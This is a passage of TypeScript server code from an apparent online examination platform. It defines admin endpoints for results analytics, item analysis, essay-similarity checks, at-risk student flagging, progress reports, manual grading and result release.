        else if (q.options && !q.options.includes(q.correctAnswer)) errors.push(`Question ${n}: the correct answer must match an option.`);
    }
  });
  if (errors.length) return res.status(400).json({ errors });
  exam.status = "published";
  await db.write();
  await recordAudit(req, "exam.published", exam.title);
  dispatchWebhook("exam.published", { examId: exam.id, title: exam.title, code: exam.code });
  res.json({ exam });
});

// ---- admin: question bank (every question across all exams) ----
app.get("/api/admin/questions", requireRole("admin"), (_req, res) => {
  const questions = db.data!.questions.map((q) => {
    const exam = db.data!.exams.find((e) => e.id === q.examId);
    return { ...q, examTitle: exam?.title ?? "—", examCode: exam?.code ?? "", examStatus: exam?.status ?? "draft" };
  });
  res.json({ questions });
});

// ---- admin: results & analytics ----
app.get("/api/admin/results", requireRoles(...GRADERS), async (_req, res) => {
  const userName = (id: string) => db.data!.users.find((u) => u.id === id)?.name ?? "Candidate";
  const examOf = (id: string) => db.data!.exams.find((e) => e.id === id);
  const submitted = db.data!.attempts.filter((a) => a.status === "submitted" && !examOf(a.examId)?.practice);
  const evMap = await proctorStore.forAttempts(submitted.map((a) => a.id));
  const flaggedAll = await proctorStore.allFlagged();

  const attempts = submitted
    .map((a) => {
      const exam = examOf(a.examId);
      const ev = cleanEvents(evMap.get(a.id) ?? [], a.submittedAt);
      return {
        id: a.id,
        candidateId: a.candidateId,
        candidateName: userName(a.candidateId),
        candidateEmail: db.data!.users.find((u) => u.id === a.candidateId)?.email ?? "",
        examId: a.examId,
        examTitle: exam?.title ?? "Examination",
        examCode: exam?.code ?? "",
        score: a.score ?? 0,
        rawScore: a.rawScore ?? a.score ?? 0,
        letter: letterFor(a.score ?? 0, exam?.gradeBands),
        passed: a.passed ?? false,
        submittedAt: a.submittedAt,
        flagCount: flaggedCount(ev),
        integrity: scoreOf(ev),
        gradingStatus: a.gradingStatus ?? "auto_graded",
      };
    })
    .sort((x, y) => (y.submittedAt ?? "").localeCompare(x.submittedAt ?? ""));

  const scores = submitted.map((a) => a.score ?? 0);
  const resBucket = (t: string) => (["mcq", "multi_select", "true_false"].includes(t) ? "mcq" : t === "short" ? "shorts" : t === "code" ? "viva" : "written");
  const qsByExam = new Map<string, string[]>();
  for (const q of db.data!.questions) { const a = qsByExam.get(q.examId) ?? []; a.push(q.type); qsByExam.set(q.examId, a); }
  const perExam = db.data!.exams
    .map((exam) => {
      const ax = submitted.filter((a) => a.examId === exam.id);
      if (!ax.length) return null;
      const s = ax.map((a) => a.score ?? 0);
      const qtypes = qsByExam.get(exam.id) ?? [];
      const cts: Record<string, number> = { mcq: 0, shorts: 0, written: 0, viva: 0 };
      for (const qt of qtypes) cts[resBucket(qt)]++;
      const dom = Object.entries(cts).sort((a, b) => b[1] - a[1])[0];
      return {
        examId: exam.id, title: exam.title, code: exam.code,
        subject: exam.subject ?? null, status: exam.status,
        type: dom && dom[1] > 0 ? dom[0] : "mcq",
        attempts: ax.length,
        avgScore: Math.round(s.reduce((p, c) => p + c, 0) / s.length),
        passRate: Math.round((ax.filter((a) => a.passed).length / ax.length) * 100),
      };
    })
    .filter((e): e is NonNullable<typeof e> => e !== null);

  res.json({
    overview: {
      attempts: submitted.length,
      inProgress: db.data!.attempts.filter((a) => a.status === "in_progress").length,
      passRate: submitted.length ? Math.round((submitted.filter((a) => a.passed).length / submitted.length) * 100) : 0,
      avgScore: scores.length ? Math.round(scores.reduce((p, c) => p + c, 0) / scores.length) : 0,
      certificates: db.data!.certificates.length,
      flags: flaggedAll.length,
    },
    perExam,
    attempts,
  });
});

// Results grouped by cohort (class) — each class's assigned exams with member-scoped stats.
app.get("/api/admin/results-by-cohort", requireRoles(...GRADERS), async (_req, res) => {
  const examOf = (id: string) => db.data!.exams.find((e) => e.id === id);
  const cohorts = db.data!.classes.map((cls) => {
    const memberSet = new Set(cls.memberIds);
    const byExam = new Map<string, { scheduledStart: string | null; assignedAt: string }>();
    for (const a of cls.assignments) {
      const existing = byExam.get(a.examId);
      if (!existing || a.assignedAt > existing.assignedAt) byExam.set(a.examId, { scheduledStart: a.scheduledStart, assignedAt: a.assignedAt });
    }
    const exams = [...byExam.entries()].map(([examId, info]) => {
      const exam = examOf(examId);
      const ax = db.data!.attempts.filter((a) => a.examId === examId && a.status === "submitted" && memberSet.has(a.candidateId));
      const scores = ax.map((a) => a.score ?? 0);
      const avgScore = scores.length ? Math.round(scores.reduce((s, v) => s + v, 0) / scores.length) : 0;
      const passRate = ax.length ? Math.round((ax.filter((a) => a.passed).length / ax.length) * 100) : 0;
      return { examId, title: exam?.title ?? "Examination", code: exam?.code ?? "", scheduledStart: info.scheduledStart, submitted: ax.length, avgScore, passRate };
    });
    const examIds = new Set(byExam.keys());
    const allAttempts = db.data!.attempts.filter((a) => a.status === "submitted" && memberSet.has(a.candidateId) && examIds.has(a.examId));
    const allScores = allAttempts.map((a) => a.score ?? 0);
    const avgScore = allScores.length ? Math.round(allScores.reduce((s, v) => s + v, 0) / allScores.length) : 0;
    const passRate = allAttempts.length ? Math.round((allAttempts.filter((a) => a.passed).length / allAttempts.length) * 100) : 0;
    const lastActivity = allAttempts.reduce<string | null>((max, a) => (a.submittedAt && (!max || a.submittedAt > max) ? a.submittedAt : max), null);
    return { id: cls.id, name: cls.name, code: cls.code ?? "", memberCount: cls.memberIds.length, examCount: exams.length, avgScore, passRate, lastActivity, exams };
  });
  res.json({ cohorts });
});

// Item analysis: per-question correct-rate, difficulty and discrimination for an exam.
app.get("/api/admin/exams/:id/item-analysis", requireRoles(...GRADERS), async (req, res) => {
  const exam = db.data!.exams.find((e) => e.id === req.params.id);
  if (!exam) return res.status(404).json({ error: "Exam not found." });
  const questions = db.data!.questions.filter((q) => q.examId === exam.id);
  const submitted = db.data!.attempts.filter((a) => a.examId === exam.id && a.status === "submitted");
  const ansMap = await answerStore.forAttempts(submitted.map((a) => a.id));

  // Top / bottom third by overall score → discrimination index per question.
  const ranked = [...submitted].sort((a, b) => (b.score ?? 0) - (a.score ?? 0));
  const tier = Math.max(1, Math.floor(ranked.length / 3));
  const topSet = new Set(ranked.slice(0, tier).map((a) => a.id));
  const botSet = new Set(ranked.slice(-tier).map((a) => a.id));

  const items = questions.map((q) => {
    let answered = 0, correct = 0, pts = 0, topC = 0, topN = 0, botC = 0, botN = 0;
    for (const a of submitted) {
      const ans = (ansMap.get(a.id) ?? []).find((x) => x.questionId === q.id);
      if (!ans || (ans.value ?? "") === "") continue;
      answered++;
      const ok = ans.correct === true;
      if (ok) correct++;
      pts += ans.awardedPoints ?? (ok ? q.points : 0);
      if (topSet.has(a.id)) { topN++; if (ok) topC++; }
      if (botSet.has(a.id)) { botN++; if (ok) botC++; }
    }
    const correctRate = answered ? Math.round((correct / answered) * 100) : null;
    const difficulty = correctRate === null ? null : correctRate >= 70 ? "easy" : correctRate >= 40 ? "medium" : "hard";
    const discrimination = topN && botN ? Math.round(((topC / topN) - (botC / botN)) * 100) / 100 : null;
    // Distractor analysis: per-option pick rate for choice questions.
    let distractors: { option: string; picks: number; pct: number; correct: boolean }[] | null = null;
    if (q.type === "mcq" || q.type === "true_false" || q.type === "multi_select") {
      const opts = q.options ?? [];
      const counts = new Map<string, number>(opts.map((o) => [o, 0]));
      for (const a of submitted) {
        const ans = (ansMap.get(a.id) ?? []).find((x) => x.questionId === q.id);
        if (!ans?.value) continue;
        const picks = q.type === "multi_select" ? parseMultiValue(ans.value) : [ans.value];
        for (const p of picks) if (counts.has(p)) counts.set(p, (counts.get(p) ?? 0) + 1);
      }
      const correctSet = new Set((q.type === "multi_select" ? (q.correctAnswers ?? []) : [q.correctAnswer]));
      distractors = opts.map((o) => ({ option: o, picks: counts.get(o) ?? 0, pct: answered ? Math.round(((counts.get(o) ?? 0) / answered) * 100) : 0, correct: correctSet.has(o) }));
    }
    return {
      id: q.id, prompt: q.prompt, type: q.type, points: q.points, sectionId: q.sectionId ?? null,
      answered, correct, correctRate, avgPoints: answered ? Math.round((pts / answered) * 10) / 10 : null,
      difficulty, discrimination, distractors,
    };
  });

  // Cronbach's alpha — internal-consistency reliability across items.
  const variance = (xs: number[]) => {
    if (xs.length < 2) return 0;
    const m = xs.reduce((s, x) => s + x, 0) / xs.length;
    return xs.reduce((s, x) => s + (x - m) ** 2, 0) / xs.length; // population variance
  };
  let alpha: number | null = null;
  const k = questions.length;
  if (k >= 2 && submitted.length >= 2) {
    const itemScores = questions.map((q) => submitted.map((a) => (ansMap.get(a.id) ?? []).find((x) => x.questionId === q.id)?.awardedPoints ?? 0));
    const totals = submitted.map((_, ai) => itemScores.reduce((s, col) => s + col[ai], 0));
    const sumItemVar = itemScores.reduce((s, col) => s + variance(col), 0);
    const totalVar = variance(totals);
    if (totalVar > 0) alpha = Math.round((k / (k - 1)) * (1 - sumItemVar / totalVar) * 100) / 100;
  }

  res.json({ exam: { id: exam.id, title: exam.title, code: exam.code }, attempts: submitted.length, items, alpha });
});

// Essay similarity: flag pairs of candidates whose written answers are highly similar.
app.get("/api/admin/exams/:id/similarity", requireRoles(...GRADERS), async (req, res) => {
  const exam = db.data!.exams.find((e) => e.id === req.params.id);
  if (!exam) return res.status(404).json({ error: "Exam not found." });
  const questions = db.data!.questions.filter((q) => q.examId === exam.id && (q.type === "essay" || q.type === "short" || q.type === "code"));
  const submitted = db.data!.attempts.filter((a) => a.examId === exam.id && a.status === "submitted");
  const ansMap = await answerStore.forAttempts(submitted.map((a) => a.id));
  const nameOf = (id: string) => db.data!.users.find((u) => u.id === id)?.name ?? "Candidate";
  const THRESHOLD = 0.6, MIN_LEN = 40;
  const pairs: { questionId: string; prompt: string; type: string; a: string; b: string; aAttempt: string; bAttempt: string; similarity: number }[] = [];
  for (const q of questions) {
    const entries = submitted
      .map((a) => {
        const text = ((ansMap.get(a.id) ?? []).find((x) => x.questionId === q.id)?.value ?? "").trim();
        return text.length >= MIN_LEN ? { candidateId: a.candidateId, attemptId: a.id, tg: trigrams(text) } : null;
      })
      .filter((e): e is { candidateId: string; attemptId: string; tg: Set<string> } => !!e);
    for (let i = 0; i < entries.length; i++) {
      for (let j = i + 1; j < entries.length; j++) {
        if (entries[i].candidateId === entries[j].candidateId) continue;
        const sim = jaccard(entries[i].tg, entries[j].tg);
        if (sim >= THRESHOLD) pairs.push({ questionId: q.id, prompt: q.prompt, type: q.type, a: nameOf(entries[i].candidateId), b: nameOf(entries[j].candidateId), aAttempt: entries[i].attemptId, bAttempt: entries[j].attemptId, similarity: Math.round(sim * 100) });
      }
    }
  }
  pairs.sort((x, y) => y.similarity - x.similarity);
  res.json({ exam: { id: exam.id, title: exam.title, code: exam.code }, scannedQuestions: questions.length, attempts: submitted.length, threshold: Math.round(THRESHOLD * 100), pairs });
});

// Cohort & term-over-term comparison + at-risk student flagging.
app.get("/api/admin/analytics/cohorts", requireRoles(...GRADERS), (_req, res) => {
  const examOf = (id: string) => db.data!.exams.find((e) => e.id === id);
  const submitted = db.data!.attempts.filter((a) => a.status === "submitted" && !examOf(a.examId)?.practice);
  const sc = (a: Attempt) => a.score ?? 0;
  const avg = (xs: number[]) => (xs.length ? Math.round(xs.reduce((s, x) => s + x, 0) / xs.length) : null);
  const passRate = (ax: Attempt[]) => (ax.length ? Math.round((ax.filter((a) => a.passed).length / ax.length) * 100) : null);

  // Cohorts = classes.
  const cohorts = db.data!.classes
    .map((c) => {
      const members = new Set(c.memberIds);
      const ax = submitted.filter((a) => members.has(a.candidateId));
      return { id: c.id, name: c.name, members: c.memberIds.length, attempts: ax.length, avgScore: avg(ax.map(sc)), passRate: passRate(ax) };
    })
    .filter((c) => c.members > 0);

  // Term-over-term = academic years (by submittedAt window), else last 6 calendar months.
  const years = db.data!.academicYears.filter((y) => y.startDate && y.endDate);
  let terms: { label: string; attempts: number; avgScore: number | null; passRate: number | null }[];
  if (years.length) {
    terms = years
      .sort((a, b) => (a.startDate ?? "").localeCompare(b.startDate ?? ""))
      .map((y) => {
        const ax = submitted.filter((a) => a.submittedAt && a.submittedAt >= y.startDate! && a.submittedAt <= y.endDate!);
        return { label: y.name, attempts: ax.length, avgScore: avg(ax.map(sc)), passRate: passRate(ax) };
      });
  } else {
    const buckets = new Map<string, Attempt[]>();
    for (const a of submitted) {
      if (!a.submittedAt) continue;
      const key = a.submittedAt.slice(0, 7); // YYYY-MM
      (buckets.get(key) ?? buckets.set(key, []).get(key)!).push(a);
    }
    terms = [...buckets.entries()]
      .sort((x, y) => x[0].localeCompare(y[0]))
      .slice(-6)
      .map(([key, ax]) => {
        const dt = new Date(key + "-01");
        return { label: dt.toLocaleString(undefined, { month: "short", year: "2-digit" }), attempts: ax.length, avgScore: avg(ax.map(sc)), passRate: passRate(ax) };
      });
  }

  // At-risk students.
  const byStudent = new Map<string, Attempt[]>();
  for (const a of submitted) (byStudent.get(a.candidateId) ?? byStudent.set(a.candidateId, []).get(a.candidateId)!).push(a);
  const atRisk: { candidateId: string; name: string; attempts: number; avgScore: number; lastScore: number; fails: number; level: "high" | "medium"; reasons: string[] }[] = [];
  for (const [cid, list] of byStudent) {
    const sorted = [...list].sort((a, b) => (a.submittedAt ?? "").localeCompare(b.submittedAt ?? ""));
    const scores = sorted.map(sc);
    const mean = scores.reduce((s, x) => s + x, 0) / scores.length;
    const fails = sorted.filter((a) => a.passed === false).length;
    const last = scores[scores.length - 1];
    const reasons: string[] = [];
    let level: "high" | "medium" | null = null;
    if (mean < 40) { level = "high"; reasons.push("Average below 40%"); }
    else if (mean < 55) { level = "medium"; reasons.push("Average below 55%"); }
    if (fails >= 2) { level = "high"; reasons.push(`${fails} failed exams`); }
    if (scores.length >= 2 && last < scores[0] - 15) { level = level ?? "medium"; reasons.push("Scores declining"); }
    if (level) atRisk.push({ candidateId: cid, name: db.data!.users.find((u) => u.id === cid)?.name ?? "Student", attempts: sorted.length, avgScore: Math.round(mean), lastScore: last, fails, level, reasons });
  }
  atRisk.sort((a, b) => (a.level === b.level ? a.avgScore - b.avgScore : a.level === "high" ? -1 : 1));

  res.json({ cohorts, terms, atRisk });
});

/** Character-trigram set for fuzzy text-similarity comparison. */
function trigrams(s: string): Set<string> {
  const t = s.toLowerCase().replace(/\s+/g, " ").trim().slice(0, 5000);
  const set = new Set<string>();
  for (let i = 0; i < t.length - 2; i++) set.add(t.slice(i, i + 3));
  return set;
}
/** Jaccard similarity (0..1) of two trigram sets. */
function jaccard(a: Set<string>, b: Set<string>): number {
  if (!a.size || !b.size) return 0;
  let inter = 0;
  for (const x of a) if (b.has(x)) inter++;
  return inter / (a.size + b.size - inter);
}

/** Grade points (4.0 scale) from a percentage score. */
function gradePoints(score: number): number { return score >= 80 ? 4 : score >= 70 ? 3 : score >= 60 ? 2 : score >= 50 ? 1 : 0; }
/** Cumulative GPA (4.0) across a student's exam scores, or null if none. */
function cumulativeGpa(scores: number[]): number | null {
  if (!scores.length) return null;
  return Math.round((scores.reduce((s, x) => s + gradePoints(x), 0) / scores.length) * 100) / 100;
}

/** Least-squares slope (points per exam) over an evenly-spaced score series. */
function regressionSlope(ys: number[]): number {
  const n = ys.length;
  if (n < 2) return 0;
  const mx = (n - 1) / 2;
  const my = ys.reduce((s, y) => s + y, 0) / n;
  let num = 0, den = 0;
  for (let i = 0; i < n; i++) { num += (i - mx) * (ys[i] - my); den += (i - mx) ** 2; }
  return den === 0 ? 0 : Math.round((num / den) * 100) / 100;
}

/** Cross-subject performance trend for a student (drives the trend infographic + summary). */
function buildStudentTrend(candidateId: string): import("../shared/types.ts").StudentTrend {
  const examOf = (id: string) => db.data!.exams.find((e) => e.id === id);
  const subjectOf = (id: string) => (examOf(id)?.subject?.trim() || "General");
  const attempts = db.data!.attempts
    .filter((a) => a.candidateId === candidateId && a.status === "submitted" && a.score != null && !examOf(a.examId)?.practice)
    .sort((a, b) => (a.submittedAt ?? "").localeCompare(b.submittedAt ?? ""));

  const points = attempts.map((a) => ({ score: a.score ?? 0, at: a.submittedAt, subject: subjectOf(a.examId), examTitle: examOf(a.examId)?.title ?? "Examination" }));

  // Overall: second-half average minus first-half average.
  const all = points.map((p) => p.score);
  const half = Math.floor(all.length / 2);
  const firstAvg = half ? all.slice(0, half).reduce((s, x) => s + x, 0) / half : (all[0] ?? 0);
  const secondAvg = half ? all.slice(all.length - half).reduce((s, x) => s + x, 0) / half : (all[all.length - 1] ?? 0);
  const delta = all.length >= 2 ? Math.round(secondAvg - firstAvg) : 0;
  const overall = { trend: (delta >= 3 ? "up" : delta <= -3 ? "down" : "flat") as "up" | "flat" | "down", delta };

  // Per subject.
  const bySubject = new Map<string, number[]>();
  for (const pt of points) (bySubject.get(pt.subject) ?? bySubject.set(pt.subject, []).get(pt.subject)!).push(pt.score);
  const subjects = [...bySubject.entries()].map(([subject, scores]) => {
    const avg = Math.round(scores.reduce((s, x) => s + x, 0) / scores.length);
    const slope = regressionSlope(scores);
    const trend: import("../shared/types.ts").SubjectTrend["trend"] =
      scores.length < 2 ? "single" : slope >= 1.5 ? "improving" : slope <= -1.5 ? "declining" : "steady";
    return { subject, attempts: scores.length, avg, best: Math.max(...scores), first: scores[0], last: scores[scores.length - 1], slope, trend, scores };
  }).sort((a, b) => b.avg - a.avg);

  // Statistical summary.
  let summary: string;
  if (subjects.length === 0) {
    summary = "No completed examinations yet, so there is no trend to report.";
  } else {
    const strongest = subjects[0];
    const weakest = subjects[subjects.length - 1];
    const declining = subjects.filter((s) => s.trend === "declining");
    const dirWord = overall.trend === "up" ? `up ${delta}%` : overall.trend === "down" ? `down ${Math.abs(delta)}%` : "broadly steady";
    const parts: string[] = [];
    parts.push(`Strongest in ${strongest.subject} (avg ${strongest.avg}%${strongest.trend !== "single" ? `, ${strongest.trend}` : ""}).`);
    if (subjects.length > 1) parts.push(`Weakest in ${weakest.subject} (avg ${weakest.avg}%${weakest.trend !== "single" ? `, ${weakest.trend}` : ""}).`);
    if (all.length >= 2) parts.push(`Overall trend is ${dirWord} versus the first half.`);
    parts.push(declining.length > 0 ? `${declining.length} subject${declining.length === 1 ? "" : "s"} flagged for attention.` : `No subjects are declining.`);
    summary = parts.join(" ");
  }

  return { points, overall, subjects, summary };
}

// Per-student progress report (aggregated; rendered as a printable PDF on the client).
app.get("/api/admin/students/:id/report", requireRoles(...STAFF), (req, res) => {
  const student = db.data!.users.find((u) => u.id === req.params.id && u.role === "candidate");
  if (!student) return res.status(404).json({ error: "Student not found." });
  const examOf = (id: string) => db.data!.exams.find((e) => e.id === id);
  const attempts = db.data!.attempts
    .filter((a) => a.candidateId === student.id && a.status === "submitted" && !examOf(a.examId)?.practice)
    .sort((a, b) => (b.submittedAt ?? "").localeCompare(a.submittedAt ?? ""));
  const exams = attempts.map((a) => {
    const exam = examOf(a.examId);
    return {
      examTitle: exam?.title ?? "Examination", examCode: exam?.code ?? "", subject: exam?.subject ?? null,
      score: a.score ?? 0, rawScore: a.rawScore ?? a.score ?? 0, letter: letterFor(a.score ?? 0, exam?.gradeBands),
      passed: a.passed ?? false, submittedAt: a.submittedAt, gradingStatus: a.gradingStatus ?? "auto_graded",
    };
  });
  const scores = exams.map((e) => e.score);
  const certificates = db.data!.certificates
    .filter((c) => c.candidateId === student.id)
    .map((c) => ({ certNumber: c.certNumber, examTitle: examOf(c.examId)?.title ?? "Examination", score: c.score, issuedAt: c.issuedAt }));
  // Attendance roll-up across this student's registrations.
  const regs = db.data!.registrations.filter((r) => r.candidateId === student.id && !examOf(r.examId)?.practice);
  const attendance = {
    registered: regs.length,
    sat: regs.filter((r) => r.status === "submitted").length,
    checkedIn: regs.filter((r) => r.checkedInAt).length,
    late: regs.filter((r) => r.flaggedLate).length,
  };
  res.json({
    student: { name: student.name, email: student.email, studentClass: student.studentClass ?? null, gender: student.gender ?? null, phone: student.phone ? (decryptString(student.phone) ?? null) : null },
    summary: {
      attempts: exams.length,
      avgScore: scores.length ? Math.round(scores.reduce((s, x) => s + x, 0) / scores.length) : null,
      best: scores.length ? Math.max(...scores) : null,
      passed: exams.filter((e) => e.passed).length,
      failed: exams.filter((e) => !e.passed).length,
      certificates: certificates.length,
      gpa: cumulativeGpa(scores),
    },
    exams, certificates, attendance,
    trend: buildStudentTrend(student.id),
    generatedAt: now(),
    org: getSettings().name || "Oriole",
  });
});

// Set a student's accommodation (extra minutes added to every exam deadline).
app.patch("/api/admin/candidates/:id/accommodations", requireRole("admin"), async (req, res) => {
  const u = db.data!.users.find((x) => x.id === req.params.id && x.role === "candidate");
  if (!u) return res.status(404).json({ error: "Student not found." });
  const m = Number(req.body?.extraMinutes);
  u.accommodationsExtraMinutes = Number.isFinite(m) && m > 0 ? Math.min(600, Math.floor(m)) : 0;
  await db.upsert("users", u);
  await recordAudit(req, "accommodation.updated", `${u.name}: +${u.accommodationsExtraMinutes} min`);
  res.json({ accommodationsExtraMinutes: u.accommodationsExtraMinutes });
});

// AI natural-language narrative of a student's cross-subject trend.
app.post("/api/admin/students/:id/trend-narrative", requireRole("admin"), async (req, res) => {
  if (!aiEnabled()) return res.status(503).json({ error: "AI is not configured. Set ANTHROPIC_API_KEY or AI_BASE_URL+AI_API_KEY on the server." });
  const student = db.data!.users.find((u) => u.id === req.params.id && u.role === "candidate");
  if (!student) return res.status(404).json({ error: "Student not found." });
  const trend = buildStudentTrend(student.id);
  if (!trend.subjects.length) return res.status(400).json({ error: "No completed exams to summarise yet." });
  const summary = [
    `Student: ${student.name}`,
    `Overall direction: ${trend.overall.trend} (${trend.overall.delta >= 0 ? "+" : ""}${trend.overall.delta}% second half vs first half)`,
    "Subjects (highest average first):",
    ...trend.subjects.map((s) => `- ${s.subject}: average ${s.avg}%, best ${s.best}%, ${s.attempts} exam(s), trend ${s.trend}`),
  ].join("\n");
  try {
    const r = await narrateTrend(summary);
    res.json(r);
  } catch (e) {
    logger.error({ err: String(e) }, "trend narrative failed");
    res.status(502).json({ error: "Couldn't reach the AI service right now — please try again." });
  }
});

app.get("/api/admin/attempts/:id", requireRoles(...STAFF), async (req, res) => {
  const attempt = db.data!.attempts.find((a) => a.id === req.params.id);
  if (!attempt) return res.status(404).json({ error: "Attempt not found." });
  const exam = db.data!.exams.find((e) => e.id === attempt.examId)!;
  const candidate = db.data!.users.find((u) => u.id === attempt.candidateId);
  const questions = servedQuestions(attempt);
  const answers = await answerStore.forAttempt(attempt.id);
  const review = questions.map((rawQ) => {
    const q = attemptQuestion(rawQ, attempt);
    const ans = answers.find((a) => a.questionId === q.id);
    return {
      answerId: ans?.id ?? null,
      questionId: q.id,
      prompt: q.prompt, type: q.type, points: q.points,
      yourAnswer: displayAnswer(q, ans?.value), correctAnswer: displayCorrect(q), correct: ans?.correct ?? false,
      awardedPoints: ans?.awardedPoints ?? 0,
      needsReview: ans?.needsReview ?? false,
      gradedBy: ans?.gradedBy ?? "auto",
      feedback: ans?.feedback ?? null,
      rubric: q.rubric ?? null,
      rubricScores: ans?.rubricScores ?? null,
      explanation: q.explanation ?? null,
      // For file-upload answers, pass the raw payload so a grader can open/download it.
      fileUpload: q.type === "file_upload" ? parseFileUpload(ans?.value) : null,
    };
  });
  const events = cleanEvents(await proctorStore.forAttempt(attempt.id), attempt.submittedAt);
  // Double-blind grading: hide identity (name, email, ref, webcam imagery) while marking.
  const anon = isAnonymized(attempt, exam);
  const reg = db.data!.registrations.find((r) => r.id === attempt.registrationId);
  res.json({
    attempt,
    exam,
    anonymous: anon,
    candidate: anon ? { name: anonLabel(attempt.id), email: "" } : { name: candidate?.name ?? "Candidate", email: candidate?.email ?? "" },
    review,
    gradingStatus: attempt.gradingStatus ?? "auto_graded",
    pendingCount: review.filter((r) => r.needsReview).length,
    proctorEvents: events,
    certificate: db.data!.certificates.find((c) => c.attemptId === attempt.id) ?? null,
    integrity: scoreOf(events),
    integrityBreakdown: breakdownOf(events),
    secondMark: attempt.secondMark ?? null,
    studentRef: anon ? null : (reg?.studentRef ?? null),
    verificationPhoto: anon ? null : (reg?.verificationPhoto ? (decryptString(reg.verificationPhoto) ?? null) : null),
    registrationId: attempt.registrationId,
    idDocumentPhoto: anon ? null : (reg?.idDocumentPhoto ? (decryptString(reg.idDocumentPhoto) ?? null) : null),
    idVerified: anon ? false : !!reg?.idVerified,
    idVerifiedBy: anon ? null : (reg?.idVerifiedBy ?? null),
    roomScanPhotos: anon ? [] : (reg?.roomScanPhotos ?? []).map((s) => decryptString(s) ?? s),
    snapshot: anon ? null : await latestSnapshot(attempt.id),
    snapshots: anon ? [] : (await snapshotStore.forAttempt(attempt.id)).map((s) => ({ id: s.id, dataUrl: decryptString(s.dataUrl), at: s.at })),
  });
});

// ---------------------------------------------------------------- MANUAL GRADING
// Review queue: submitted attempts that still have short answers awaiting a human grade.
app.get("/api/admin/grading/queue", requireRoles(...GRADERS), async (_req, res) => {
  const pendingAttempts = db.data!.attempts.filter((a) => a.gradingStatus === "pending_review");
  const ansMap = await answerStore.forAttempts(pendingAttempts.map((a) => a.id));
  const queue = pendingAttempts
    .map((a) => {
      const exam = db.data!.exams.find((e) => e.id === a.examId);
      const candidate = db.data!.users.find((u) => u.id === a.candidateId);
      const answers = ansMap.get(a.id) ?? [];
      const anon = isAnonymized(a, exam);
      return {
        attemptId: a.id,
        candidateName: anon ? anonLabel(a.id) : (candidate?.name ?? "Candidate"),
        candidateEmail: anon ? "" : (candidate?.email ?? ""),
        anonymous: anon,
        examTitle: exam?.title ?? "Examination",
        submittedAt: a.submittedAt,
        provisionalScore: a.score ?? 0,
        toGrade: answers.filter((an) => an.needsReview).length,
      };
    })
    .sort((x, y) => (x.submittedAt ?? "").localeCompare(y.submittedAt ?? ""));
  res.json({ queue, total: queue.length });
});

// Award points (and optional feedback) to a single answer, then recompute the attempt.
app.patch("/api/admin/answers/:id/grade", requireRoles(...GRADERS), async (req, res) => {
  const ans = await answerStore.byId(String(req.params.id));
  if (!ans) return res.status(404).json({ error: "Answer not found." });
  const question = db.data!.questions.find((q) => q.id === ans.questionId);
  if (!question) return res.status(400).json({ error: "Question not found." });

  let awarded: number;
  if (question.rubric?.length && req.body?.rubricScores && typeof req.body.rubricScores === "object") {
    // Rubric grading: total = sum of per-criterion scores (each clamped to its max).
    const scores: Record<string, number> = {};
    for (const c of question.rubric) scores[c.id] = Math.max(0, Math.min(c.maxPoints, Number(req.body.rubricScores[c.id]) || 0));
    ans.rubricScores = scores;
    awarded = rubricTotal(question.rubric, scores, question.points);
  } else {
    const raw = Number(req.body?.awardedPoints);
    if (!Number.isFinite(raw)) return res.status(400).json({ error: "awardedPoints must be a number." });
    awarded = Math.max(0, Math.min(question.points, Math.round(raw)));
  }

  ans.awardedPoints = awarded;
  ans.correct = awarded >= question.points;
  ans.needsReview = false;
  ans.gradedBy = "manual";
  if (typeof req.body?.feedback === "string") ans.feedback = req.body.feedback.slice(0, 1000) || null;

  const attempt = db.data!.attempts.find((a) => a.id === ans.attemptId)!;
  // Recompute from the attempt's full answer set, with the just-graded answer applied.
  const answers = await answerStore.forAttempt(attempt.id);
  const idx = answers.findIndex((a) => a.id === ans.id);
  if (idx >= 0) answers[idx] = ans; else answers.push(ans);
  recomputeAttempt(attempt, answers);
  const remaining = answers.filter((a) => a.needsReview).length;
  await answerStore.upsert(ans);
  await db.upsert("attempts", attempt);
  res.json({ answer: ans, attempt, remaining });
});

// Publish a graded result: finalize score, issue certificate on pass, mark released.
app.post("/api/admin/attempts/:id/release", requireRoles(...GRADERS), async (req, res) => {
  const attempt = db.data!.attempts.find((a) => a.id === req.params.id);
  if (!attempt) return res.status(404).json({ error: "Attempt not found." });
  const answers = await answerStore.forAttempt(attempt.id);
  const remaining = answers.filter((a) => a.needsReview).length;
  if (remaining > 0) {
    return res.status(409).json({ error: `${remaining} answer(s) still need grading before release.` });
  }
  recomputeAttempt(attempt, answers);
  attempt.gradingStatus = "released";
  attempt.releasedAt = now();
  const certificate = attempt.passed ? issueCertificate(attempt) : null;
  await db.upsert("attempts", attempt);
  if (certificate) await db.upsert("certificates", certificate);
  await recordAudit(req, "result.released", `${db.data!.users.find((u) => u.id === attempt.candidateId)?.name ?? "Candidate"} · ${attempt.score}%`);
  void notifyResultReleased(attempt);
  dispatchWebhook("result.released", { attemptId: attempt.id, examId: attempt.examId, candidateId: attempt.candidateId, score: attempt.score, passed: attempt.passed });
  res.json({ attempt, certificate });
});

// Bulk release: publish every fully-graded pending-review attempt for an exam at once.
app.post("/api/admin/exams/:id/release-all", requireRoles(...GRADERS), async (req, res) => {
  const exam = db.data!.exams.find((e) => e.id === req.params.id);
  if (!exam) return res.status(404).json({ error: "Exam not found." });
  const pending = db.data!.attempts.filter((a) => a.examId === exam.id && a.gradingStatus === "pending_review");
  let released = 0, skipped = 0;
  for (const attempt of pending) {
    const answers = await answerStore.forAttempt(attempt.id);
    if (answers.some((a) => a.needsReview)) { skipped++; continue; } // still has ungraded answers
    recomputeAttempt(attempt, answers);
    attempt.gradingStatus = "released";
    attempt.releasedAt = now();
    const cert = attempt.passed ? issueCertificate(attempt) : null;
    await db.upsert("attempts", attempt);
    if (cert) await db.upsert("certificates", cert);
    void notifyResultReleased(attempt);
    released++;
  }
  await recordAudit(req, "results.released_bulk", `${released} for ${exam.title}`);
  res.json({ released, skipped });
});

// Re-apply the current grade scale to every submitted attempt for an exam.
app.post("/api/admin/exams/:id/recompute-results", requireRole("admin"), async (req, res) => {
  const exam = db.data!.exams.find((e) => e.id === req.params.id);
  if (!exam) return res.status(404).json({ error: "Exam not found." });
  const submitted = db.data!.attempts.filter((a) => a.examId === exam.id && a.status === "submitted");
  for (const attempt of submitted) {
    const answers = await answerStore.forAttempt(attempt.id);
    recomputeAttempt(attempt, answers);
    await db.upsert("attempts", attempt);
  }
  await recordAudit(req, "results.recomputed", `${submitted.length} for ${exam.title}`);
  res.json({ updated: submitted.length });
});

// Record an independent second-marker score for reconciliation (double-blind grading).
